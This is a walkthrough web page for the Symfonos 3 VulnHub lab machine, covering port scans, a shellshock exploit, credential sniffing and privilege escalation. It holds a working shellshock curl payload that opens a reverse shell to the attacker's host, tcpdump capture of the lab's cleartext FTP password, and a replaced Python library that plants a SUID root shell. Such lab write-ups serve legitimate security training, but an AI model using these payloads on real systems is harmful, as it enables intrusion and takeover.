@@ -1,0 +1,164 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Symfonos 3 Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Symfonos 3 Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#cerberus">Shell - cerberus</a></li>
+        <li><a href="#hades">Shell - hades</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>To start off, this box presented us with two paths.  One being a rabbit hole, and the other being a simple shellshock exploit.  Once on the box we gain shell as cerberus and have admin permissions on tcpdump.  Using tcpdump we listen on localhost and find the credentials for the user Hades being passed over the network in cleartext.  We ssh in as the user Hades using these credentials.  Hades has write access to the python 2.3 library.  Abusing these write permissions, we are able to modify a python library file that is being called from a script that is being ran as root.  We successfully gain root command execution which leads us to a root shell.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Wed Sep 22 12:24:03 2021 as: nmap -p- -oN ping_tcp 10.0.0.15&#13;&#10;Nmap scan report for 10.0.0.15&#13;&#10;Host is up (0.0010s latency).&#13;&#10;Not shown: 65532 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;21/tcp open  ftp&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;MAC Address: 00:0C:29:A1:E0:77 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Wed Sep 22 12:24:11 2021 -- 1 IP address (1 host up) scanned in 8.19 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Wed Sep 22 12:25:00 2021 as: nmap -p21,22,80 -sV -sC -oN script_tcp 10.0.0.15&#13;&#10;Nmap scan report for 10.0.0.15&#13;&#10;Host is up (0.00015s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;21/tcp open  ftp     ProFTPD 1.3.5b&#13;&#10;22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)&#13;&#10;|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)&#13;&#10;|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)&#13;&#10;80/tcp open  http    Apache httpd 2.4.25 ((Debian))&#13;&#10;|_http-server-header: Apache/2.4.25 (Debian)&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html).&#13;&#10;MAC Address: 00:0C:29:A1:E0:77 (VMware)&#13;&#10;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Wed Sep 22 12:25:39 2021 -- 1 IP address (1 host up) scanned in 38.36 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>We are unable to login to the ftp server so the first point of interest comes from the web server.  I start off using gobuster to enumerate directories, but it seems like there is going to be a lot of recrusive directory enumeration that needs to done so I switch to feroxbuster.  I wanr ferbuster with two wordlists.  raft-large-words.txt and directory-list-2.3-medium.txt:</li>
+    <ul>
+        <li>feroxbuster --url http://10.0.0.15 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -d 0 -t 25 -o 10.0.0.15-feroxbuster,raft-large-words</li>
+            <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ cat 10.0.0.15-feroxbuster,raft-large-words | grep -v 403 | sort | uniq&#13;&#10;200       20l       21w      202c http://10.0.0.15/gate/&#13;&#10;200       20l       21w      202c http://10.0.0.15/gate/cerberus/&#13;&#10;200       21l       34w      273c http://10.0.0.15/gate/cerberus/tartarus/&#13;&#10;200       22l       28w      241c http://10.0.0.15/&#13;&#10;200       53l     1157w     6825c http://10.0.0.15/gate/cerberus/tartarus/research&#13;&#10;301        9l       28w      305c http://10.0.0.15/gate&#13;&#10;301        9l       28w      314c http://10.0.0.15/gate/cerberus&#13;&#10;301        9l       28w      323c http://10.0.0.15/gate/cerberus/tartarus&#13;&#10;301        9l       28w      330c http://10.0.0.15/gate/cerberus/tartarus/charon&#13;&#10;301        9l       28w      330c http://10.0.0.15/gate/cerberus/tartarus/hermes
+    </pre>
+    
+        <li>feroxbuster --url http://10.0.0.15 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 0 -t 25 -f -o 10.0.0.15-ferox,dirmed</li>
+            <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ cat 10.0.0.15-ferox,dirmed                                     &#13;&#10;403        9l       28w      274c http://10.0.0.15/cgi-bin/&#13;&#10;403        9l       28w      274c http://10.0.0.15/icons/&#13;&#10;403        9l       28w      274c http://10.0.0.15/icons/small/&#13;&#10;200       20l       21w      202c http://10.0.0.15/gate/&#13;&#10;200       20l       21w      202c http://10.0.0.15/gate/cerberus/&#13;&#10;200        1l       10w       64c http://10.0.0.15/cgi-bin/underworld/
+            </pre>
+    </ul>
+
+    <li>Browsing through the path of /gate/cerberus/tartarus/charon|charon|research turns out to be a rabbit hole.  The source code on /tartarus/ hints us towards this fact. </li>
+    <ul>
+        <li>/tartarus/ - &quot;&lt;!-- The underworld can be cruel... but it can also be misleading. --&gt;&quot;</li>
+    </ul>
+
+    <li>/cgi-bin/underworld turns out to be a custom cgi-bin directory.  I run Nikto against this with custom flags specifying the custom cgi-bin directory.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ nikto -host http://10.0.0.15 -Cgidirs &quot;/cgi-bin/underworld&quot; | tee 10.0.0.15-nikto &#13;&#10;- Nikto v2.1.6&#13;&#10;---------------------------------------------------------------------------&#13;&#10;+ Target IP:          10.0.0.15&#13;&#10;+ Target Hostname:    10.0.0.15&#13;&#10;+ Target Port:        80&#13;&#10;+ Start Time:         2021-09-23 10:00:01 (GMT-4)&#13;&#10;---------------------------------------------------------------------------&#13;&#10;+ Server: Apache/2.4.25 (Debian)&#13;&#10;+ The anti-clickjacking X-Frame-Options header is not present.&#13;&#10;+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&#13;&#10;+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&#13;&#10;+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.&#13;&#10;+ Server may leak inodes via ETags, header found with file /, inode: f1, size: 58e15fe4052c8, mtime: gzip&#13;&#10;+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS &#13;&#10;+ Uncommon header &apos;93e4r0-cve-2014-6278&apos; found, with contents: true&#13;&#10;+ OSVDB-112004: /cgi-bin/underworld: Site appears vulnerable to the &apos;shellshock&apos; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).&#13;&#10;+ Uncommon header &apos;93e4r0-cve-2014-6271&apos; found, with contents: true&#13;&#10;+ OSVDB-112004: /cgi-bin/underworld: Site appears vulnerable to the &apos;shellshock&apos; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).&#13;&#10;+ OSVDB-3233: /icons/README: Apache default file found.&#13;&#10;+ 8676 requests: 0 error(s) and 11 item(s) reported on remote host&#13;&#10;+ End Time:           2021-09-23 10:00:52 (GMT-4) (51 seconds)&#13;&#10;---------------------------------------------------------------------------&#13;&#10;+ 1 host(s) tested
+    </pre>
+
+    <li>The web server appears to be vulernable to shellshock.  This will easily get us a reverse shell.</li>
+
+    <br>
+
+    <h2><a id="cerberus">Shell - cerberus</a></h2>
+
+    <li>I set my reverse listener on port 4444 and send a curl against /cgi-bin/underworld with the user agent header set to exploit the shellshock vulnerability.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ curl http://10.0.0.15/cgi-bin/underworld -H &quot;User-Agent: () { :; }; /bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&apos;&quot;
+    </pre>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 4444&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.0.0.15.&#13;&#10;Ncat: Connection from 10.0.0.15:34348.&#13;&#10;bash: no job control in this shell&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;         &#13;&#10;&lt;/cgi-bin$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;                    &#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 4444&#13;&#10;                                                                                                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                                                                                                                                             148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 4444&#13;&#10;&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ id&#13;&#10;uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)&#13;&#10;cerberus@symfonos3:/usr/lib/cgi-bin$ 
+    </pre>
+
+    <li>The first thing I do is run linpeas.sh.   The first thing that stands out is that we are a part of the pcap group, meaning we can capture packets.  We have access to /usr/sbin/tcpdump with admin permissions set.</li>
+
+    <img src="../images/symfonos_3/tcpdump.png">
+
+    <br>
+    <br>
+
+    <h2><a id="hades">Shell - hades</a></h2>
+
+    <li>I decide to use tcpdump to sniff the local network traffic.</li>
+
+    <pre>
+cerberus@symfonos3:/tmp$ tcpdump -i lo&#13;&#10;tcpdump: verbose output suppressed, use -v or -vv for full protocol decode&#13;&#10;listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes&#13;&#10;                                (Removed Lines)&#13;&#10;09:52:01.682948 IP localhost.52090 &gt; localhost.ftp: Flags [.], ack 1, win 342, options [nop,nop,TS val 20155685 ecr 20155685], length 0&#13;&#10;09:52:01.684217 IP localhost.ftp &gt; localhost.52090: Flags [P.], seq 1:56, ack 1, win 342, options [nop,nop,TS val 20155686 ecr 20155685], length 55: FTP: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]&#13;&#10;09:52:01.684291 IP localhost.52090 &gt; localhost.ftp: Flags [.], ack 56, win 342, options [nop,nop,TS val 20155686 ecr 20155686], length 0&#13;&#10;09:52:01.684311 IP localhost.52090 &gt; localhost.ftp: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 20155686 ecr 20155686], length 12: FTP: <mark>USER hades</mark>
+09:52:01.684313 IP localhost.ftp &gt; localhost.52090: Flags [.], ack 13, win 342, options [nop,nop,TS val 20155686 ecr 20155686], length 0&#13;&#10;09:52:01.684783 IP localhost.ftp &gt; localhost.52090: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 20155686 ecr 20155686], length 33: FTP: 331 Password required for hades&#13;&#10;09:52:01.684854 IP localhost.52090 &gt; localhost.ftp: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 20155686 ecr 20155686], length 23: FTP: <mark>PASS PTpZTfU4vxgzvRBE</mark>
+09:52:01.691568 IP localhost.ftp &gt; localhost.52090: Flags [P.], seq 89:115, ack 36, win 342, options [nop,nop,TS val 20155688 ecr 20155686], length 26: FTP: 230 User hades logged in&#13;&#10;09:52:01.691648 IP localhost.52090 &gt; localhost.ftp: Flags [P.], seq 36:51, ack 115, win 342, options [nop,nop,TS val 20155688 ecr 20155688], length 15: FTP: CWD /srv/ftp/&#13;&#10;09:52:01.691880 IP localhost.ftp &gt; localhost.52090: Flags [P.], seq 115:143, ack 51, win 342, options [nop,nop,TS val 20155688 ecr 20155688], length 28: FTP: 250 CWD command successful
+    </pre>
+
+    <li>We are able to sniff the credentials for the user hades from their login to the ftp server.  The password is PTpZTfU4vxgzvRBE</li>
+
+    <br>
+
+    <li>We login to the Hades users using the ssh</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_3]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p PTpZTfU4vxgzvRBE ssh hades@10.0.0.15                                                            130 &Cross;&#13;&#10;Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64&#13;&#10;&#13;&#10;The programs included with the Debian GNU/Linux system are free software;&#13;&#10;the exact distribution terms for each program are described in the&#13;&#10;individual files in /usr/share/doc/*/copyright.&#13;&#10;&#13;&#10;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&#13;&#10;permitted by applicable law.&#13;&#10;No mail.&#13;&#10;Last login: Mon Apr  6 14:06:02 2020 from 192.168.50.128&#13;&#10;hades@symfonos3:~$ 
+    </pre>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I run linpeas again as Hades and I find that I am part of the "gods" group which gives me write access to  files inside the python2.7 lib directory - /usr/lib/python2.7/</li>
+    <pre>
+&boxDR;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxH;&boxVL; Interesting GROUP writable files (not in Home) (max 500)&#13;&#10;&boxUR; https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files&#13;&#10;  Group hades:&#13;&#10;&#13;&#10;  Group gods:&#13;&#10;/usr/lib/python2.7&#13;&#10;/usr/lib/python2.7/numbers.py&#13;&#10;/usr/lib/python2.7/mailbox.py&#13;&#10;/usr/lib/python2.7/plistlib.pyc&#13;&#10;/usr/lib/python2.7/pydoc.pyc&#13;&#10;/usr/lib/python2.7/SimpleHTTPServer.py&#13;&#10;#)You_can_write_even_more_files_inside_last_directory&#13;&#10;&#13;&#10;/etc/python2.7/sitecustomize.py
+    </pre>
+
+    <li>I also notice that I have read directions on the directory /opt/ftpclient.</li>
+    <pre>
+hades@symfonos3:/opt$ ls -la&#13;&#10;total 12&#13;&#10;drwxr-xr-x  3 root root  4096 Jul 20  2019 .&#13;&#10;drwxr-xr-x 22 root root  4096 Jul 19  2019 ..&#13;&#10;drwxr-x---  2 root hades 4096 Apr  6  2020 ftpclient
+    </pre>
+
+    <li>I also have read permissions to the files inside this the "ftpclient" directory.  I take a look at ftpclient.py and I find a vulnerability.</li>
+    <pre>
+hades@symfonos3:/opt/ftpclient$ cat ftpclient.py &#13;&#10;import ftplib&#13;&#10;&#13;&#10;ftp = ftplib.FTP(&apos;127.0.0.1&apos;)&#13;&#10;ftp.login(user=&apos;hades&apos;, passwd=&apos;PTpZTfU4vxgzvRBE&apos;)&#13;&#10;&#13;&#10;ftp.cwd(&apos;/srv/ftp/&apos;)&#13;&#10;&#13;&#10;def upload():&#13;&#10;    filename = &apos;/opt/client/statuscheck.txt&apos;&#13;&#10;    ftp.storbinary(&apos;STOR &apos;+filename, open(filename, &apos;rb&apos;))&#13;&#10;    ftp.quit()&#13;&#10;&#13;&#10;upload()
+    </pre>
+
+    <li>Based on the fact that this script is owned by root, executable, and readable by hades, means to me that root is likely running this script.  This is also the script we saw running when we sniffed the traffic on localhost has cerberus.  This script is importing ftplib.  Combined with the fact that we already know we have write permissions to the python2.7 lib directory I take a look at the user hades permissions to ftplib.py specifically.</li>
+
+    <pre>
+hades@symfonos3:/opt/ftpclient$ find / -name ftplib.py -ls 2&gt;/dev/null&#13;&#10;   139979      4 -rwxrw-r--   1 root     gods           89 Sep 23 10:29 /usr/lib/python2.7/ftplib.py
+    </pre>
+
+    <li>We can alter the contents of ftplib.py to pass malicious code to the script /opt/ftpclient/ftpclient.py which root is being ran by root.  Therefore, we get command execution as root.  This is the line of code we are targetting from ftpclient.py</li>
+
+    <pre>
+ftp = ftplib.FTP(&apos;127.0.0.1&apos;)
+    </pre>
+
+    <li>We will recreate ftplib.py with a malicious method called FTP.  I delete all the contents from /usr/lib/python2.7/ftplib.py and replace it with only this:</li>
+
+    <pre>
+hades@symfonos3:/opt/ftpclient$ cat /usr/lib/python2.7/ftplib.py&#13;&#10;import os&#13;&#10;&#13;&#10;def FTP(a):&#13;&#10;&#9;os.system(&quot;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&quot;);
+    </pre>
+
+    <li>The malicious code in /usr/lib/python2.7/ftplib.py will now create a root owned bash file in the /tmp directory with the SUID bit set.  We go to /tmp and wait for it to be generated.</li>
+
+    <pre>
+hades@symfonos3:/tmp$ ls -la&#13;&#10;total 4612&#13;&#10;drwxrwxrwt  9 root     root        4096 Sep 23 10:52 .&#13;&#10;drwxr-xr-x 22 root     root        4096 Jul 19  2019 ..&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .font-unix&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .ICE-unix&#13;&#10;-rwxr-xr-x  1 cerberus cerberus  470149 Sep 23 09:55 linpeas.sh
+<mark>-rwsr-sr-x  1 root     root      975488 Sep 23 10:52 rootbash</mark>
+drwx------  3 root     root        4096 Sep 22 11:23 systemd-private-b3950a3936fe498d87e4f6a8bb5c726d-apache2.service-TvRruh&#13;&#10;drwx------  3 root     root        4096 Sep 22 11:23 systemd-private-b3950a3936fe498d87e4f6a8bb5c726d-systemd-timesyncd.service-AM0Iif&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .X11-unix&#13;&#10;drwxrwxrwt  2 root     root        4096 Sep 22 11:23 .XIM-unix
+    </pre>
+
+    <li>Now we execute the rootbash file with the -p flag and we gain a root shell.</li>
+
+    <pre>
+hades@symfonos3:/tmp$ ./rootbash -p&#13;&#10;rootbash-4.2# id&#13;&#10;uid=1000(hades) gid=1000(hades) euid=0(root) egid=0(root) groups=0(root),1000(hades),1002(gods)&#13;&#10;rootbash-4.2# 
+    </pre>
+
+</body>
+</html>
+
